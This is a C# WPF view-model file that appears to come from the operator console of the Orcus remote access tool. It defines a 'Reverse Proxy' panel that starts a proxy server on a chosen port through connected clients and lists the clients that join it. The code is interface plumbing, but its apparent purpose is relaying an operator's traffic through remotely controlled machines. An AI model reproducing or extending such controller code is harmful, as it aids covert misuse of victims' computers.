using System;
using System.Collections.ObjectModel;
using System.Windows;
using Orcus.Administration.Commands.ReverseProxy;
using Orcus.Administration.Plugins.CommandViewPlugin;
using Sorzus.Wpf.Toolkit;

namespace Orcus.Administration.ViewModels.CommandViewModels
{
    public class ReverseProxyViewModel : CommandView
    {
        private bool _isRunning;
        private ObservableCollection<ReverseProxyClient> _reverseProxyClients;
        private ReverseProxyCommand _reverseProxyCommand;
        private RelayCommand _startServerCommand;
        private RelayCommand _stopServerCommand;

        public override string Name { get; } = (string) Application.Current.Resources["ReverseProxy"];
        public override Category Category { get; } = Category.Client;

        public bool IsRunning
        {
            get { return _isRunning; }
            set { SetProperty(value, ref _isRunning); }
        }

        public ObservableCollection<ReverseProxyClient> ReverseProxyClients
        {
            get { return _reverseProxyClients; }
            set { SetProperty(value, ref _reverseProxyClients); }
        }

        public RelayCommand StartServerCommand
        {
            get
            {
                return _startServerCommand ??
                       (_startServerCommand =
                           new RelayCommand(
                               parameter =>
                               {
                                   ReverseProxyClients = new ObservableCollection<ReverseProxyClient>();
                                   try
                                   {
                                       _reverseProxyCommand.StartServer("0.0.0.0", (ushort) (double) parameter);
                                       IsRunning = true;
                                   }
                                   catch (Exception e)
                                   {
                                       WindowService.ShowMessageBox(e.Message,
                                           (string) Application.Current.Resources["Error"], MessageBoxButton.OK,
                                           MessageBoxImage.Error);
                                   }
                               }));
            }
        }

        public RelayCommand StopServerCommand
        {
            get
            {
                return _stopServerCommand ??
                       (_stopServerCommand = new RelayCommand(parameter =>
                       {
                           _reverseProxyCommand.StopServer();
                           IsRunning = false;
                       }));
            }
        }

        protected override void InitializeView(IClientController clientController, ICrossViewManager crossViewManager)
        {
            _reverseProxyCommand = clientController.Commander.GetCommand<ReverseProxyCommand>();
            _reverseProxyCommand.ClientAdded += ReverseProxyCommandOnClientAdded;
            _reverseProxyCommand.ClientRemoved += ReverseProxyCommandOnClientRemoved;
        }

        private void ReverseProxyCommandOnClientRemoved(object sender, ReverseProxyClient reverseProxyClient)
        {
            Application.Current.Dispatcher.BeginInvoke(new Action(() => ReverseProxyClients.Remove(reverseProxyClient)));
        }

        private void ReverseProxyCommandOnClientAdded(object sender, ReverseProxyClient reverseProxyClient)
        {
            Application.Current.Dispatcher.BeginInvoke(new Action(() => ReverseProxyClients.Add(reverseProxyClient)));
        }
    }
}